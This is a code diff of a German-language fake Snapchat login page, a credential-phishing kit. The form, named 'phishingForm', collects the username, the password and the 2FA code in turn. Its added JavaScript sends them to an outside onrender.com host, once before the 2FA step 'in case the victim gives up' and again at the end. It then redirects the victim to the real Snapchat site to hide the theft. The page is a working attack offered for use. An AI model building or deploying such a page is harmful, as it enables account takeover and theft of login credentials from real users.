@@ -1,261 +1,112 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Einloggen | Snapchat</title>
-  <link rel="stylesheet" href="style.css" />
-  <link rel="icon" type="image/png" href="snapchat-logo.png" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat Login</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #FFFC00; margin: 0; padding: 0; }
+    .login-container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .logo { display: block; margin: 0 auto 20px; width: 60px; }
+    h2 { text-align: center; color: #000; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
+    button { width: 100%; padding: 12px; background: #FFFC00; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+    .error-message { color: red; font-size: 14px; margin-top: 10px; display: none; }
+  </style>
 </head>
 <body>
   <div class="login-container">
     <form id="phishingForm">
       <!-- SCHRITT 1: Nutzername -->
-      <div class="login-box" id="step1"> 
-        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
-        <h2>Logge dich bei<br />Snapchat ein</h2>
+      <div class="login-box" id="step1">
+        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
+        <h2>Logge dich bei Snapchat ein</h2>
         <label for="username">Nutzername oder E-Mail</label>
-        <input type="text" id="username" name="username" required />
+        <input type="text" id="username" name="username" required>
         <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
       </div>
 
       <!-- SCHRITT 2: Passwort -->
       <div class="login-box" id="step2" style="display: none;">
-        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
         <h2>Passwort eingeben</h2>
-        <div class="email-mask" id="email-display">
-          <!-- Hier wird der Nutzername angezeigt -->
-        </div>
+        <div class="email-mask" id="email-display"></div>
         <label for="password">Passwort</label>
-        <input type="password" id="password" name="password" required />
-        <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
-          Falsches Passwort. Noch 2 Versuche bis zur Kontosperrung.
-        </div>
+        <input type="password" id="password" name="password" required>
+        <div id="password-error" class="error-message">Falsches Passwort. Versuche es erneut.</div>
         <button type="button" id="step2-button" onclick="goToStep3()" disabled>Weiter</button>
       </div>
 
-      <!-- SCHRITT 3: 2FA-Code (NEU!) -->
+      <!-- SCHRITT 3: 2FA -->
       <div class="login-box" id="step3" style="display: none;">
-        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
         <h2>Sicherheitsüberprüfung</h2>
-        <p>Wir haben einen Code an dein Handy gesendet. Bitte gib ihn unten ein.</p>
-        <input type="text" id="twoFACode" name="twoFACode" placeholder="6-stelliger Code" required />
-        <div id="code-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
-          Ungültiger Code. Versuche es erneut.
-        </div>
+        <p>Wir haben einen Code an dein Handy gesendet. Gib ihn unten ein.</p>
+        <input type="text" id="twoFACode" name="twoFACode" placeholder="6-stelliger Code" required>
+        <div id="code-error" class="error-message">Ungültiger Code.</div>
         <button type="button" id="step3-button" onclick="submitAllData()">Bestätigen</button>
       </div>
     </form>
   </div>
 
-  <footer class="desktop-only">
-    <div class="footer-columns">
-      <div>
-        <h4>Unternehmen</h4>
-        <ul>
-          <li><a href="https://www.snap.com/?lang=de-DE" target="_blank">Snap Inc.</a></li>
-          <li><a href="https://careers.snap.com/" target="_blank">Karriere</a></li>
-          <li><a href="https://newsroom.snap.com/" target="_blank">News</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Community</h4>
-        <ul>
-          <li><a href="https://help.snapchat.com/" target="_blank">Support</a></li>
-          <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=de-DE" target="_blank">Community-Richtlinien</a></li>
-          <li><a href="https://values.snap.com/safety/safety-center?lang=de-DE" target="_blank">Sicherheitscenter</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Werbung</h4>
-        <ul>
-          <li><a href="https://forbusiness.snapchat.com/" target="_blank">Anzeigen schalten</a></li>
-          <li><a href="https://www.snap.com/ad-policies?lang=de-DE" target="_blank">Werberichtlinien</a></li>
-          <li><a href="https://www.snap.com/political-ads?lang=de-DE" target="_blank">Politische Anzeigen</a></li>
-          <li><a href="https://www.snap.com/brand-guidelines?lang=de-DE" target="_blank">Markenrichtlinien</a></li>
-          <li><a href="https://help.snapchat.com/hc/de/articles/7047502545044" target="_blank">Aktionsrichtlinien</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Rechtliches</h4>
-        <ul>
-          <li><a href="https://values.snap.com/privacy/privacy-center?lang=de-DE" target="_blank">Datenschutzzentrum</a></li>
-          <li><a href="https://help.snapchat.com/hc/de/articles/11399265637012" target="_blank">Deine Datenschutzoptionen</a></li>
-          <li><a href="https://www.snap.com/cookie-policy?lang=de-DE" target="_blank">Cookie-Richtlinie</a></li>
-          <li><a href="https://help.snapchat.com/hc/de/articles/7012332110996" target="_blank">Missbrauch melden</a></li>
-          <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=de-DE" target="_blank">Kreativtools-Nutzungsbedingungen</a></li>
-          <li><a href="https://www.snap.com/terms/create-geofilter?lang=de-DE" target="_blank">Geofilter-Bedingungen</a></li>
-          <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=de-DE" target="_blank">Lens Studio Lizenz</a></li>
-        </ul>
-      </div>
-    </div>
-
-    <div class="language-selector desktop-only">
-      <label for="language-desktop">Sprache</label>
-      <select id="language-desktop" name="language">
-        <option selected value="de">Deutsch</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-        <option value="es">Español</option>
-      </select>
-    </div>
-  </footer>
-
-  <div class="footer-dropdown mobile-only">
-    <div>
-      <button class="dropdown-toggle">Unternehmen</button>
-      <ul class="dropdown-content">
-        <li><a href="https://www.snap.com/?lang=de-DE" target="_blank">Snap Inc.</a></li>
-        <li><a href="https://careers.snap.com/" target="_blank">Karriere</a></li>
-        <li><a href="https://newsroom.snap.com/" target="_blank">News</a></li>
-      </ul>
-    </div>
-    <div>
-      <button class="dropdown-toggle">Community</button>
-      <ul class="dropdown-content">
-        <li><a href="https://help.snapchat.com/" target="_blank">Support</a></li>
-        <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=de-DE" target="_blank">Community-Richtlinien</a></li>
-        <li><a href="https://values.snap.com/safety/safety-center?lang=de-DE" target="_blank">Sicherheitscenter</a></li>
-      </ul>
-    </div>
-    <div>
-      <button class="dropdown-toggle">Werbung</button>
-      <ul class="dropdown-content">
-        <li><a href="https://forbusiness.snapchat.com/" target="_blank">Anzeigen schalten</a></li>
-        <li><a href="https://www.snap.com/ad-policies?lang=de-DE" target="_blank">Werberichtlinien</a></li>
-        <li><a href="https://www.snap.com/political-ads?lang=de-DE" target="_blank">Politische Anzeigen</a></li>
-      </ul>
-    </div>
-    <div>
-      <button class="dropdown-toggle">Rechtliches</button>
-      <ul class="dropdown-content">
-        <li><a href="https://values.snap.com/privacy/privacy-center?lang=de-DE" target="_blank">Datenschutzzentrum</a></li>
-        <li><a href="https://help.snapchat.com/hc/de/articles/11399265637012" target="_blank">Deine Datenschutzoptionen</a></li>
-        <li><a href="https://www.snap.com/cookie-policy?lang=de-DE" target="_blank">Cookie-Richtlinie</a></li>
-        <li><a href="https://help.snapchat.com/hc/de/articles/7012332110996" target="_blank">Missbrauch melden</a></li>
-      </ul>
-    </div>
-
-    <div class="language-selector mobile-only">
-      <label for="language-mobile">Sprache</label>
-      <select id="language-mobile" name="language">
-        <option selected value="de">Deutsch</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-        <option value="es">Español</option>
-      </select>
-    </div>
-  </div>
-
-  <div class="bottom-bar">
-    <a href="https://values.snap.com/privacy/privacy-policy?lang=de-DE" target="_blank">Datenschutzbestimmungen</a>
-    <a href="https://www.snap.com/terms?lang=de-DE" target="_blank">Nutzungsbedingungen</a>
-  </div>
-
-  <script src="script.js"></script>
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    function handleLanguageChange(selectedLang) {
-      switch (selectedLang) {
-        case "de":
-          window.location.href = "/index.html";
-          break;
-        case "en":
-          window.location.href = "/en.html";
-          break;
-        case "fr":
-          window.location.href = "/fr.html";
-          break;
-        case "es":
-          window.location.href = "/es.html";
-          break;
-      }
+  <script>
+    // Nutzername → Passwort
+    function goToStep2() {
+      const username = document.getElementById("username").value;
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("email-display").innerHTML = 
+        username.substring(0, 3) + "***" + username.split("@")[1] + 
+        ' <a href="#" onclick="goToStep1()">Ändern?</a>';
     }
 
-    const desktopSelect = document.getElementById("language-desktop");
-    const mobileSelect = document.getElementById("language-mobile");
-
-    if (desktopSelect) {
-      desktopSelect.addEventListener("change", function () {
-        handleLanguageChange(this.value);
-      });
-    }
-
-    if (mobileSelect) {
-      mobileSelect.addEventListener("change", function () {
-        handleLanguageChange(this.value);
-      });
-    }
-
-    if (window.innerWidth <= 768) {
-      document.querySelectorAll(".dropdown-toggle").forEach(button => {
-        button.addEventListener("click", () => {
-          const content = button.nextElementSibling;
-          const isVisible = content.style.display === "block";
-
-          document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
-          document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
-
-          if (!isVisible) {
-            content.style.display = "block";
-            button.classList.add("active");
-          }
-        });
-      });
-    }
-  });
+    // Passwort → 2FA
+    function goToStep3() {
+      const password = document.getElementById("password").value;
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("step3").style.display = "block";
       
+      // Daten VOR 2FA senden (falls Opfer abbricht)
+      fetch('https://snapchat-usyu.onrender.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: document.getElementById("username").value,
+          password: password
+        })
+      });
+    }
+
+    // FINALE ÜBERMITTLUNG (Username + Passwort + 2FA)
+    function submitAllData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const twoFACode = document.getElementById("twoFACode").value;
+      
+      fetch('https://snapchat-usyu.onrender.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password, twoFACode })
+      })
+      .then(() => {
+        // ERST HIER UMLEITEN (nach erfolgreicher Übertragung)
+        window.location.href = "https://accounts.snapchat.com";  
+      })
+      .catch(err => {
+        document.getElementById("code-error").style.display = "block";
+      });
+    }
+
+    // Validierung der Eingaben
+    document.getElementById("username").addEventListener("input", function() {
+      document.getElementById("step1-button").disabled = !this.value;
     });
-  document.addEventListener("DOMContentLoaded", function () {
-    function handleLanguageChange(selectedLang) {
-      switch (selectedLang) {
-        case "de":
-          window.location.href = "/index.html";
-          break;
-        case "en":
-          window.location.href = "/en.html";
-          break;
-        case "fr":
-          window.location.href = "/fr.html";
-          break;
-        case "es":
-          window.location.href = "/es.html";
-          break;
-      }
-    }
-
-    const desktopSelect = document.getElementById("language-desktop");
-    const mobileSelect = document.getElementById("language-mobile");
-
-    if (desktopSelect) {
-      desktopSelect.addEventListener("change", function () {
-        handleLanguageChange(this.value);
-      });
-    }
-
-    if (mobileSelect) {
-      mobileSelect.addEventListener("change", function () {
-        handleLanguageChange(this.value);
-      });
-    }
-
-    if (window.innerWidth <= 768) {
-      document.querySelectorAll(".dropdown-toggle").forEach(button => {
-        button.addEventListener("click", () => {
-          const content = button.nextElementSibling;
-          const isVisible = content.style.display === "block";
-
-          document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
-          document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
-
-          if (!isVisible) {
-            content.style.display = "block";
-            button.classList.add("active");
-          }
-        });
-      });
-    }
-  });
+    document.getElementById("password").addEventListener("input", function() {
+      document.getElementById("step2-button").disabled = !this.value;
+    });
+    document.getElementById("twoFACode").addEventListener("input", function() {
+      document.getElementById("step3-button").disabled = !this.value;
+    });
   </script>
 </body>
 </html>
